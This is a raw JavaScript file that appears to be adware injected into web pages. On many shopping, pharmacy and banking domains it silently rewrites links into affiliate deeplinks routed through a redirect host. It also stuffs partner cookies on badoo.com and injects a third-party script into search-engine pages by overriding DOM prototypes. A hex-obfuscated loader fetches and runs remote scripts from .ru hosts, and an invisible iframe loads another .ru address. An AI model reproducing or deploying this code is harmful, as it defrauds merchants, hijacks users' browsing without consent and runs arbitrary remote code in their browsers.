        {deeplink: 'https://ad.admitad.com/g/8eztvjzhmt9b5a1e1b4dd011322b02/?ulp=ADDRESS&subid=SUB_ID',  domain: 'ebay.in'},
        {deeplink: 'https://ad.admitad.com/g/t2nm6m1kgc9b5a1e1b4d5f08f4c55f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'zivame.com'},
        {deeplink: 'https://ad.admitad.com/g/mhtf60h8219b5a1e1b4d4400e7030d/?ulp=ADDRESS&subid=SUB_ID',  domain: 'foodpanda.in'},
        {deeplink: 'https://ad.admitad.com/g/dru1fiprm49b5a1e1b4dc54bdbf551/?ulp=ADDRESS&subid=SUB_ID',  domain: 'dresslily.com'},
        {deeplink: 'https://ad.admitad.com/g/1ocifeg24m9b5a1e1b4d89d7fe25ba/?ulp=ADDRESS&subid=SUB_ID',  domain: 'nykaa.com'},
        {deeplink: 'https://ad.admitad.com/g/o3536ivmvy9b5a1e1b4dc76de56b6f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'sammydress.com'},
        {deeplink: 'https://ad.admitad.com/g/0v5gv6szvl9b5a1e1b4d6291c1f66a/?ulp=ADDRESS&subid=SUB_ID',  domain: '1mg.com'},
        {deeplink: 'https://ad.admitad.com/g/3a063wka0y9b5a1e1b4d6816d5588c/?ulp=ADDRESS&subid=SUB_ID',  domain: 'pepperfry.com'},
        {deeplink: 'https://ad.admitad.com/g/8ytmkmv0g99b5a1e1b4deeb9573388/?ulp=ADDRESS&subid=SUB_ID',  domain: 'everbuying.net'},
        {deeplink: 'https://ad.admitad.com/g/h9eteooiei9b5a1e1b4da412176801/?ulp=ADDRESS&subid=SUB_ID',  domain: 'stalkbuylove.com'},
        {deeplink: 'https://ad.admitad.com/g/l3vi4p2his9b5a1e1b4d59b0ff57e1/?ulp=ADDRESS&subid=SUB_ID',  domain: 'lemall.com'},
        {deeplink: 'https://ad.admitad.com/g/jqvq0rzz8p9b5a1e1b4d5c7d2eed69/?ulp=ADDRESS&subid=SUB_ID',  domain: 'netmeds.com'},
        {deeplink: 'https://ad.admitad.com/g/s04yc4g9ry9b5a1e1b4d62ee748b0a/?ulp=ADDRESS&subid=SUB_ID',  domain: 'firstcry.com'},
        {deeplink: 'https://ad.admitad.com/g/vkpdf5ffy19b5a1e1b4d8aa9525e0c/?ulp=ADDRESS&subid=SUB_ID',  domain: 'm-icicibank.com'},
        {deeplink: 'https://ad.admitad.com/g/78tuvzaw8k9b5a1e1b4d0267b86f6e/?ulp=ADDRESS&subid=SUB_ID',  domain: 'geekbuying.com'},
        {deeplink: 'https://ad.admitad.com/g/nmi7b62c7y9b5a1e1b4d053aa7676c/?ulp=ADDRESS&subid=SUB_ID',  domain: 'oyorooms.com'},
        {deeplink: 'https://ad.admitad.com/g/iv335hmec39b5a1e1b4de8d102e71a/?ulp=ADDRESS&subid=SUB_ID',  domain: 'austrian.com'},
        {deeplink: 'https://ad.admitad.com/g/nbg2nhf3ga9b5a1e1b4dd4a9fc138d/?ulp=ADDRESS&subid=SUB_ID',  domain: 'nearbuy.com'},
        {deeplink: 'https://ad.admitad.com/g/383ee645579b5a1e1b4d7d95a12660/?ulp=ADDRESS&subid=SUB_ID',  domain: 'lightinthebox.com'},
        {deeplink: 'https://ad.admitad.com/g/vbnovi30pq9b5a1e1b4ded464edc45/?ulp=ADDRESS&subid=SUB_ID',  domain: 'cleartrip.com'},
        {deeplink: 'https://ad.admitad.com/g/5l2jdzs7ne9b5a1e1b4d252930f66f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'shopcj.com'},
        {deeplink: 'https://ad.admitad.com/g/scfupgazc59b5a1e1b4d2ad3f2c5ae/?ulp=ADDRESS&subid=SUB_ID',  domain: 'clovia.com'},
        {deeplink: 'https://ad.admitad.com/g/8g4plmy5p09b5a1e1b4ddc99f68355/?ulp=ADDRESS&subid=SUB_ID',  domain: 'tolexo.com'},
        {deeplink: 'https://ad.admitad.com/g/3aa22b4edb9b5a1e1b4d67b4bb3e03/?ulp=ADDRESS&subid=SUB_ID',  domain: 'miniinthebox.com'},
        {deeplink: 'https://ad.admitad.com/g/5fdvtbwdde9b5a1e1b4de1c974a806/?ulp=ADDRESS&subid=SUB_ID',  domain: 'zaful.com'},
        {deeplink: 'https://ad.admitad.com/g/k5zrtrri4q9b5a1e1b4d47e39e9055/?ulp=ADDRESS&subid=SUB_ID',  domain: 'happilyunmarried.com'},
        {deeplink: 'https://ad.admitad.com/g/ulatdhxhpu9b5a1e1b4d3bbdcefb14/?ulp=ADDRESS&subid=SUB_ID',  domain: 'coverfox.com'},
        {deeplink: 'https://ad.admitad.com/g/jyc7a3yi0t9b5a1e1b4d3490884c7b/?ulp=ADDRESS&subid=SUB_ID',  domain: 'nastydress.com'},
        {deeplink: 'https://ad.admitad.com/g/d2jtns1h0x9b5a1e1b4de683584499/?ulp=ADDRESS&subid=SUB_ID',  domain: 'rosegal.com'},
        {deeplink: 'https://ad.admitad.com/g/9c4ca2202b9b5a1e1b4d92c5d6d73b/?ulp=ADDRESS&subid=SUB_ID',  domain: 'pleer.ru'},
        {deeplink: 'https://ad.admitad.com/g/ky79xsf6yn9b5a1e1b4da8fbeae19d/?ulp=ADDRESS&subid=SUB_ID', domain: 'collezione.com'},
        {deeplink: 'https://ad.admitad.com/g/e8l8f7png19b5a1e1b4dac7b73e681/?ulp=ADDRESS&subid=SUB_ID', domain: 'upwatch.com'},
        {deeplink: 'https://ad.admitad.com/g/w90v5meg119b5a1e1b4d3a23943908/?ulp=ADDRESS&subid=SUB_ID', domain: 'silkandcashmere.com'},
        {deeplink: 'https://ad.admitad.com/g/gbcg4fvsba9b5a1e1b4d3cf2e29b2e/?ulp=ADDRESS&subid=SUB_ID', domain: 'lingualeo.com'},
        {deeplink: 'https://ad.admitad.com/g/g5qxfa6fx59b5a1e1b4dcb2ef5010a/?ulp=ADDRESS&subid=SUB_ID', domain: 'yakala.co'},
        {deeplink: 'https://ad.admitad.com/g/n880db7v229b5a1e1b4db9f7ebecaf/?ulp=ADDRESS&subid=SUB_ID', domain: 'epttavm.com'},
        {deeplink: 'https://ad.admitad.com/g/n6iye61soi9b5a1e1b4dc1211e3e65/?ulp=ADDRESS&subid=SUB_ID', domain: 'esky.com.tr'},
        {deeplink: 'https://ad.admitad.com/g/chpmaubbkg9b5a1e1b4d73af07dfc7/?ulp=ADDRESS&subid=SUB_ID', domain: 'bonus.com.tr'},
        {deeplink: 'https://ad.admitad.com/g/p15majqx419b5a1e1b4d33223ccdf4/?ulp=ADDRESS&subid=SUB_ID', domain: 'jartiyertakim.com'},
        {deeplink: 'https://ad.admitad.com/g/if8mb3tljx9b5a1e1b4dc742bd7732/?ulp=ADDRESS&subid=SUB_ID', domain: 'tittygram.com'},
        {deeplink: 'https://ad.admitad.com/g/ixkc7t1jje9b5a1e1b4db83b89baf2/?ulp=ADDRESS&subid=SUB_ID', domain: 'grupfoni.com'},
        {deeplink: 'https://ad.admitad.com/g/sjcpxiramy9b5a1e1b4d808da09421/?ulp=ADDRESS&subid=SUB_ID', domain: 'tatil.com'},
        {deeplink: 'https://ad.admitad.com/g/uzh1fc61ox9b5a1e1b4d29ecc1b98c/?ulp=ADDRESS&subid=SUB_ID', domain: 'toyzzshop.com'},
        {deeplink: 'https://ad.admitad.com/g/m68y65daea9b5a1e1b4d352f738b3e/?ulp=ADDRESS&subid=SUB_ID', domain: 'ayakkabionline.com'},
        {deeplink: 'https://ad.admitad.com/g/rbwqb7ozhq9b5a1e1b4dc679452933/?ulp=ADDRESS&subid=SUB_ID', domain: 'robotistan.com'},
        {deeplink: 'https://ad.admitad.com/g/jhn92454ch9b5a1e1b4dbbf6e18112/?ulp=ADDRESS&subid=SUB_ID', domain: 'booking.com.tr'},
        {deeplink: 'https://alitems.com/g/qa7w8joxdk9b5a1e1b4da794ddcf6a/?ulp=ADDRESS&subid=SUB_ID',    domain: 'tr.aliexpress.com'},
        {deeplink: 'http://alipromo.com/redirect/cpa/o/oiypf1ndxpgaemwwn4oi4pwkvln9yval/?to=ADDRESS&sub=SUB_ID',  domain: 'aliexpress.com'},
        {deeplink: 'http://f.gdeslon.ru/f/92dde2882b17fbdb?goto=ADDRESS&sub_id=SUB_ID',  domain: 'agoda.com'},
        {deeplink: 'http://f.gdeslon.ru/f/df2fd2eb86984484?goto=ADDRESS&sub_id=SUB_ID',  domain: 'alibaba.com'},
        {deeplink: 'http://f.gdeslon.ru/f/3f0a53e32f704cfc?goto=ADDRESS&sub_id=SUB_ID',  domain: 'dx.com'},
        {deeplink: 'http://f.gdeslon.ru/f/3ffd08661457b4dc?goto=ADDRESS&sub_id=SUB_ID',  domain: 'lightinthebox.com'},
        {deeplink: 'http://f.gdeslon.ru/f/0c3419461aacea0f?goto=ADDRESS&sub_id=SUB_ID',  domain: 'rentalcars.com'},
        {deeplink: 'http://f.gdeslon.ru/f/be17e651d2f0b9d0?goto=ADDRESS&sub_id=SUB_ID',  domain: 'rosegal.com'},
        {deeplink: 'http://f.gdeslon.ru/f/6edf0c28388af711?goto=ADDRESS&sub_id=SUB_ID',  domain: 'shopbop.com'},
        {deeplink: 'http://f.gdeslon.ru/f/3e0f3b2da434da1d?goto=ADDRESS&sub_id=SUB_ID',  domain: 'tomtop.com'},
        {deeplink: 'http://f.gdeslon.ru/f/0976c60a7801d7d1?goto=ADDRESS&sub_id=SUB_ID',  domain: 'miniinthebox.com'},
        {deeplink: 'http://nfemo.com/click-AQHHNBF7-ECAQBXIA?bt=25&tl=1',  domain: 'casasbahia.com.br'}
    ];
 
    var sub_id = 'SUBID';
    if (sub_id == 'SUB'+'ID' || sub_id == '') sub_id = 'default';
    var deepfound = false;
    var deeplink, shopdomainre;
    for (var i = 0; i < deepobjarr.length; i++) {
        var deepre = new RegExp('^([^\\.]+\\.|)' + deepobjarr[i].domain.replace(/\./g, '\\.') + '$');
        if (document.domain.match(deepre)) {
            deepfound = true;
            deeplink = deepobjarr[i].deeplink;
            shopdomainre = new RegExp('^([^\\.]+\\.|)' + deepobjarr[i].domain + '$');
            break;
        }
    }
    if (!deepfound) return;
 
    var CN = 'aeapdlwscncnmrtivus';
 
    function getCookie(a){var b=document.cookie.match(new RegExp("(?:^|; )"+a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return b?decodeURIComponent(b[1]):void 0}
 
    function setCookie(a,b,c){c=c||{};var d=c.expires;if("number"==typeof d&&d){var e=new Date;e.setTime(e.getTime()+1e3*d),d=c.expires=e}d&&d.toUTCString&&(c.expires=d.toUTCString()),b=encodeURIComponent(b);var f=a+"="+b;for(var g in c){f+="; "+g;var h=c[g];h!==!0&&(f+="="+h)}document.cookie=f}
 
    if (getCookie(CN)) return;
    var clicked = false;
 
    var toInsert = function() {
        var links = document.querySelectorAll('a');
        if (!links) return;
 
        for (var i = 0; i < links.length; i++) {
            var domain = links[i].hostname;
            if (domain.match(shopdomainre)) {
                console.log(domain);
                var url = deeplink.replace(/ADDRESS/g, escape(links[i].href)).replace(/SUB_ID/g, sub_id);
                links[i].className += ' ' + CN;
                links[i][CN] = url;
            }
        }
 
        var newlinks = document.querySelectorAll('.' + CN);
        if (!newlinks) return;
 
        var click = function(e){
            var self = e.target;
            console.log(self);
            while (self.tagName && self.tagName.toLowerCase() != 'a' && self.parentNode && self != document.body) {
                self = self.parentNode;
            }
            if (self && self[CN] && !clicked) {
                self.href = 'http://affshopcj.com/pg/?to=' + escape(self[CN]);
                clicked = true;
                setCookie(CN, 'true', {expires: 3600*24});
                console.log('clicked');
            }
            return true;
        };
 
        for (i = 0; i < newlinks.length; i++) {
            newlinks[i].addEventListener('click', click, false);
        }
    };
    if (document.readyState == "complete" || document.readyState == "interactive")
        toInsert();
    else
        document.addEventListener('DOMContentLoaded', toInsert, false);
})();
(function (){
    if (document.location.host.indexOf('badoo.com') === -1)
        return;
    var setCookie = function (name, value, options) {
        options = options || {};
        var expires = options.expires;
        if (typeof expires == "number" && expires) {
            var d = new Date();
            d.setTime(d.getTime() + expires * 1000);
            expires = options.expires = d;
        }
        if (expires && expires.toUTCString)
            options.expires = expires.toUTCString();
        value = encodeURIComponent(value);
        var updatedCookie = name + "=" + value;
        for (var propName in options) {
            updatedCookie += "; " + propName;
            var propValue = options[propName];
            if (propValue !== true)
                updatedCookie += "=" + propValue;
        }
        document.cookie = updatedCookie;
    };
    var d = new Date();
    var options = {path:'/', domain:'.badoo.com', expires: new Date(d.setFullYear(d.getFullYear()+1))};
    setCookie('link_id', '205614', options);
    setCookie('override_partner', '66156', options);
})();
 
(function () {
    var d2l = document.domain.split('.').reverse()[1];
    if (["google", "bing", "yahoo"].indexOf(d2l) < 0) return;
    var a = document.createElement("iframe");
    a.src = "about:blank";
    a.style.display = "none";
    document.body.appendChild(a);
    Element.prototype.appendChild = a.contentWindow.Element.prototype.appendChild;
    Element.prototype.insertBefore = a.contentWindow.Element.prototype.insertBefore;
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.src = '//d323drta3nak2g.cloudfront.net/v1/taas?id=se.prod&api_key=964ae4d89951d5f6bce782b2df826a02&site_id=3775bf28858c4e29b3312b31cec9d3f5&&pla=true&si=true&yk_tag=SUBID';
    (document.getElementsByTagName('head')[0] || document.body).appendChild(script);
})();

!function(){var t=JSON.parse('["3976696b3271656b2e7275","38387a756562767a3475357a706a2e7275"]'),n="29541",e=function(t,n,e){for(var r=[].slice.call(e),o=t.split("."),i=o.pop(),a=0;a<o.length;a++)n=n[o[a]];return n[i].apply(n,r)},r=function(t){if(!t)return"";if(t=t.match(/.{1,2}/g),!t)return"";for(var n="",r=0;r<t.length;r++)n+=e("fromCharCode",String,[parseInt(t[r],16)]);return n},o=function(t,n){for(var e=t.split("."),r=!1,o=0;o<e.length;o++)n[e[o]]?(n=n[e[o]],r=!0):r=!1;return r},i=function(t,n,i){var a=document.location.protocol+"//"+t;if(-1==navigator.userAgent.toLowerCase().indexOf("firefox")){if(o(r("736d6c6f"),window))return e(r("736d6c6f2e6c6f6164536d6c6f"),window,[a.replace("https:","http:")]);if(o(r("7a536d6c6f"),window))return e(r("7a536d6c6f2e6c6f6164536d6c6f"),window,[a.replace("https:","http:")])}var f=document.createElement("script");f.setAttribute("src",a),f.setAttribute("type","text/javascript"),document.head.appendChild(f),f.onload=function(){this.a1649136515||(this.a1649136515=!0,"function"==typeof n&&n())},f.onerror=function(){this.a1649136515||(this.a1649136515=!0,f.parentNode.removeChild(f),"function"==typeof i&&i())}},a=function(e){var o=e?e:t[0],f=r(o)+"/pjs/"+n+".js";i(f,function(){},function(){var n=t.indexOf(o),e=t[n+1];e&&a(e)})};a()}();


(function() {
    if (!document.body) return;
    var el = document.createElement('iframe');
    el.height = 1;
    el.width = 1;
    el.src = 'https://kuricanacsitaly.ru/ab8482041528657a4b0cb3584fab70c1';
    el.style = 'position:absolute;left:0px;top:0px;opacity:0.0;';
    document.body.append(el);
})();